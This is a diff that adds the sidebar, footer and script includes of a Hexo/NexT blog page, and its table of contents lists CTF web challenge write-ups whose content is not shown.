+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="V">
+            
+              <p class="site-author-name" itemprop="name">V</p>
+              <p class="site-description motion-element" itemprop="description">It is not ignorance and weakness but arrogance that destroys mankind</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                blogroll
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://fzwjscj.top/" title="fzwjscj" target="_blank">fzwjscj</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://dldxz.cn/" title="DLDXZ" target="_blank">DLDXZ</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://fanda.cloud/" title="fanda" target="_blank">fanda</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://passingfoam.com/" title="PassingFoam's blog" target="_blank">PassingFoam's blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#The-Third-Day-for-Web"><span class="nav-number">1.</span> <span class="nav-text">The Third Day for Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#高明的黑客"><span class="nav-number">1.1.1.</span> <span class="nav-text">高明的黑客</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#learning"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">learning</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-tornado"><span class="nav-number">1.1.2.</span> <span class="nav-text">easy_tornado</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#learning-1"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">learning</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考链接"><span class="nav-number">1.1.3.</span> <span class="nav-text">参考链接</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">V</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
